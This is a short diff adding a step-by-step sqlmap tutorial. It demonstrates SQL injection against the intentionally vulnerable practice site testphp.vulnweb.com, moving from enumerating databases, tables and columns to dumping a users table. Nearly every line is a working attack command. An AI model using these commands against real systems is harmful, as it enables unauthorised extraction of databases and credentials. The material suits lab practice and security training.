@@ -1,0 +1,14 @@
+STEP 1: In Terminal type sqlmap --help, you will get details and commands of sqlmap.
+STEP 2: To fetch database name use below command:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 - -dbs
+• Type “Y” to skip test payload specific for other DBMSes.
+• Type “N” to not include all tests for 'MySQL'
+• Type “N” to not keep testing other parameters.
+STEP 3: To fetch table name from database acuart use below command:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+STEP 4: To fetch columns name from table users use below command:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns
+STEP 5: To dumb data from any table use below command:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump
+Type “N” to not store hashes to temporary files.
+• Type “N” to not crack them via dictionary-based attack.
